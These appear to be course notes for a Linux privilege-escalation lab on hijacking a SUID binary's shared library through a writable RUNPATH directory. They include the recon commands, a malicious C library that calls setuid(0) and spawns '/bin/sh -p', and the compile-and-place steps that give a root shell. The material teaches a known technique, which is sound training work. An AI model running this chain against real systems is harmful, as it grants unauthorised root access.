# Section 21 — Shared Object Hijacking

## ID
210

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 21 — Shared Object Hijacking

## Description
Hijacking a SUID binary's dynamically loaded shared library by placing a malicious .so in a writable RUNPATH directory, causing the binary to execute attacker-controlled code as root.

## Tags
shared-object, suid, runpath, ldd, readelf, privesc

## Commands
- `ls -la <SUID_BINARY>`
- `ldd <SUID_BINARY>`
- `readelf -d <SUID_BINARY> | grep PATH`
- `ls -la <RUNPATH_DIR>`
- `cp /lib/x86_64-linux-gnu/libc.so.6 <RUNPATH_DIR>/<LIBNAME>.so`
- `gcc <SRC>.c -fPIC -shared -o <RUNPATH_DIR>/<LIBNAME>.so`
- `ldd --version`

## What This Section Covers
Programs compiled with a custom RUNPATH load shared libraries from that directory first. If a SUID binary has a RUNPATH pointing to a world-writable directory, an attacker can place a malicious `.so` there that replaces the legitimate library. When the SUID binary runs, it loads the attacker's library and executes code as root. The key recon chain is: find SUID binary → `ldd` to see dependencies → `readelf` to check RUNPATH → verify directory is writable.

## Methodology
1. Identify a SUID binary: `find / -perm -4000 2>/dev/null` or spot one like `payroll`
2. Check shared library dependencies with `ldd <BINARY>`
3. Look for custom library paths with `readelf -d <BINARY> | grep PATH`
4. Verify the RUNPATH directory is writable: `ls -la <RUNPATH_DIR>`
5. Find the function name the binary expects — copy a dummy `.so` in and run the binary; the error reveals the undefined symbol (e.g. `dbquery`)
6. Write a malicious `.c` file implementing that function with `setuid(0)` and `system("/bin/sh -p")`
7. Compile and place it: `gcc src.c -fPIC -shared -o <RUNPATH_DIR>/<LIBNAME>.so`
8. Execute the SUID binary — it loads your library and drops you into a root shell

## Multi-step Workflow (optional)
```
# 1. Inspect the SUID binary
ls -la ~/shared_obj_hijack/payroll
ldd ~/shared_obj_hijack/payroll
readelf -d ~/shared_obj_hijack/payroll | grep PATH

# 2. Check if RUNPATH directory is writable
ls -la /development/

# 3. Find the expected function name
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
~/shared_obj_hijack/payroll
# Error: undefined symbol: dbquery

# 4. Create malicious library implementing dbquery
cat << 'EOF' > /tmp/src.c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
EOF

# 5. Compile and place in RUNPATH
gcc /tmp/src.c -fPIC -shared -o /development/libshared.so

# 6. Execute SUID binary — get root
~/shared_obj_hijack/payroll
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — glibc version | 2.27 | `ldd --version` |

## Key Takeaways
- The attack chain is: SUID binary → `ldd` → `readelf -d` for RUNPATH → writable directory → replace `.so` → root
- Use `ldd` to find library dependencies and `readelf -d <binary> | grep PATH` to find where they're loaded from
- To discover the expected function name, copy a dummy library into the RUNPATH and run the binary — the "undefined symbol" error tells you exactly what to implement
- `/bin/sh -p` preserves the effective UID from SUID — without `-p`, bash drops privileges
- This differs from LD_PRELOAD: LD_PRELOAD injects via sudo env vars; shared object hijacking exploits a writable RUNPATH on a SUID binary

## Gotchas
- The RUNPATH directory must be writable by your user — if it's not, this technique won't work
- You must implement the exact function name the binary expects (e.g. `dbquery`), or the binary will still fail with an undefined symbol error
- Use `/bin/sh -p` (not `/bin/bash`) to preserve SUID privileges — bash drops effective UID without `-p`
- Don't confuse RPATH with RUNPATH — both set library search paths but RUNPATH can be overridden by `LD_LIBRARY_PATH` while RPATH cannot
